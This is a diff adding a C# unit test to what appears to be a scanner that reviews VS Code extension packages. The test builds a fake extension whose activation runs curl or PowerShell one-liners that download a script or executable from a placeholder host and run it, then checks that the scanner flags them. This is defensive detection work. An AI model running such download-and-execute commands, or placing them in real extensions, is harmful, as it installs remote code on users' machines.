@@ -1090,6 +1090,22 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "extension/scripts/run.bat" } && f.Detail.Contains("starts it", StringComparison.Ordinal));
     }
 
+    [Theory]
+    [InlineData("curl -o \"%TEMP%\\\\b.bat\" https://example.invalid/b.bat && \"%TEMP%\\\\b.bat\"", true)]
+    [InlineData("curl -o %TEMP%\\\\b.zip https://example.invalid/b.zip && %TEMP%\\\\b.zip", false)]
+    [InlineData("curl https://example.invalid/b.bat -o %TEMP%\\\\b.bat&&%TEMP%\\\\b.bat", true)]
+    [InlineData("iwr https://example.invalid/b.ps1 -OutFile b.ps1; .\\\\b.ps1", true)]
+    [InlineData("curl -o b.exe https://example.invalid/b.exe | ./b.exe", true)]
+    [InlineData("curl -o \"%TEMP%\\\\b.bat\" https://example.invalid/b.bat && type \"%TEMP%\\\\b.bat\"", false)]
+    [InlineData("curl -o \"%TEMP%\\\\b.bat\" https://example.invalid/b.bat && \"%TEMP%\\\\c.bat\"", false)]
+    public void A_downloaded_script_run_as_a_bare_command_after_a_separator_is_noteworthy(string command, bool noteworthy)
+    {
+        var pkg = """{"name":"tools","publisher":"acme","version":"1.0.0","main":"./extension.js"}""";
+        var r = Review(Zip("acme.tools-1.0.0.vsix", ("extension/package.json", U(pkg)),
+            ("extension/extension.js", U("const { exec } = require('child_process');\nexports.activate = () => exec('cmd.exe /c " + command + "');"))));
+        Assert.Equal(noteworthy, r.Findings.Any(f => f.Rule == "package/download-and-start"));
+    }
+
     [Fact]
     public void A_vscode_extension_that_pipes_a_socket_into_a_shell_named_by_a_variable_or_sends_a_key_to_a_webhook_is_noteworthy()
     {
